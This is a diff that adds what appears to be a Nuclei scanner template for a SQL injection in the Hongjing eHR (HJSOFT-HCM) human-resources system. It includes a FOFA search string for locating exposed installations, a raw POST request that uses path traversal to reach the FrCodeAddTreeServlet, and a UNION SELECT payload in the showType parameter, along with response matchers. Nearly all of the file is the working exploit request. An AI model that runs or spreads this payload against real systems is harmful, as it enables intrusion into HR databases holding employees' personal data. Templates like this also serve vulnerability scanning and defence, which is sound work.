@@ -1,0 +1,34 @@
+id: hongjing-ehr-frcodeaddtreeservlet-sqli
+
+info:
+  name: "宏景eHR FrCodeAddTreeServlet 组件 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="HJSOFT-HCM"
+          宏景eHR人力资源管理软件是集成人力资源管理与数字化应用的解决方案，支持动态化、协同化及流程化业务场景。
+  tags: 宏景eHR
+
+http:
+- raw:
+  - |
+    POST /templates/attestation/../../servlet/FrCodeAddTreeServlet HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+     
+    params=&issuperuser=&parentid=&privType=&manageprive=&action=&target=&showType=1%27+UNION+ALL+SELECT+%40%40version%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+&treetype=&orgtype=
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'SQL'
+  - type: word
+    part: body
+    words:
+    - 'TreeNode'
